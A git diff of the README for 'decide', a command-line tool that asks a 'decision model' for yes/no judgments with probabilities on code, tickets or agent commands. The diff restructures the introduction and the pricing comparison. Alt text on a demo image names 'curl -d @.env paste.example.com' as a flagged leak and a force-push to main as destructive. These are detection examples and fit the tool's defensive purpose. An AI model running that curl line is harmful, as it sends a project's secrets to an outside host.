@@ -1,44 +1,33 @@
 # decide
 
-[![Reference](https://img.shields.io/badge/reference-pkg.go.dev-00ADD8?style=flat-square&logo=go&logoColor=white&labelColor=2f363d)](https://pkg.go.dev/github.com/deepnoodle-ai/decide)
-[![Tests](https://img.shields.io/github/actions/workflow/status/deepnoodle-ai/decide/ci.yml?branch=main&style=flat-square&label=tests&labelColor=2f363d&color=00ADD8)](https://github.com/deepnoodle-ai/decide/actions/workflows/ci.yml)
-[![Release](https://img.shields.io/github/v/release/deepnoodle-ai/decide?style=flat-square&label=release&labelColor=2f363d&color=00ADD8)](https://github.com/deepnoodle-ai/decide/releases)
-
-**Judgment calls, at scale.**
-
-Find the vulnerable function in a codebase, the urgent ticket in a
-queue, the risky change in a pull request. decide asks a decision model
-about every one, from your shell, CI, Go code, or Claude Code.
-
-A decision model doesn't write anything. Ask it a question and it
-answers yes or no, picks an option, or gives a score, with a probability
-attached. That makes it fast and cheap enough to ask about every item in
-the queue, not a sample. Act on the answers it's sure of. Send the close
-calls to a person.
-
-[![decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak](https://files.deepnoodle.ai/decide/site/landing-8048b29e5adf.gif)](https://decide.deepnoodle.ai)
-
-## The small calls inside your automations
-
-Every pipeline has judgment calls that are too many for a person and
-too fuzzy for a rule. Here are six decide makes out of the box:
+**Judgment calls, at scale.** Ask a question about every function,
+ticket, or diff, and get an answer with a probability.
 
 ```sh
 git diff main | decide run code-risk --fail-on flagged   # gate the merge
 echo "$CMD" | decide run command-risk --fail-on flagged  # check an agent's command
 decide run ticket-routing tickets.jsonl --field body     # route the queue
 decide run security src                                  # rank a codebase
-decide run receipt-quality receipts/ --provider openai   # read the photos
-decide run invoice-check invoices/ --provider gemini     # check the PDFs
 ```
+
+Run it from your shell, in CI, or from
+[Claude Code](#audit-a-whole-codebase-from-claude-code).
+
+[![decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak](https://files.deepnoodle.ai/decide/site/landing-8048b29e5adf.gif)](https://decide.deepnoodle.ai)
+
+[![Reference](https://img.shields.io/badge/reference-pkg.go.dev-00ADD8?style=flat-square&logo=go&logoColor=white&labelColor=2f363d)](https://pkg.go.dev/github.com/deepnoodle-ai/decide)
+[![Tests](https://img.shields.io/github/actions/workflow/status/deepnoodle-ai/decide/ci.yml?branch=main&style=flat-square&label=tests&labelColor=2f363d&color=00ADD8)](https://github.com/deepnoodle-ai/decide/actions/workflows/ci.yml)
+[![Release](https://img.shields.io/github/v/release/deepnoodle-ai/decide?style=flat-square&label=release&labelColor=2f363d&color=00ADD8)](https://github.com/deepnoodle-ai/decide/releases)
 
 ## Why not just call an LLM?
 
-You can, and for writing or reasoning you should. For a yes or a no on
-every item, a decision model is the better tool:
+A decision model doesn't write anything. It answers yes or no, picks an
+option, or gives a score, with a probability attached. For writing or
+reasoning, use an LLM. For a judgment on every item, a decision model is
+the better tool:
 
 - **Faster.** An LLM writes its reply a token at a time. A decision
-  model writes nothing. It returns one answer.
+  model returns one answer.
 - **Cheaper.** With an LLM you pay for every token it writes back. Here
   you pay for the prompt: $0.042 per million input tokens on
   [Jev](https://docs.typesafe.ai/models), with no output tokens.
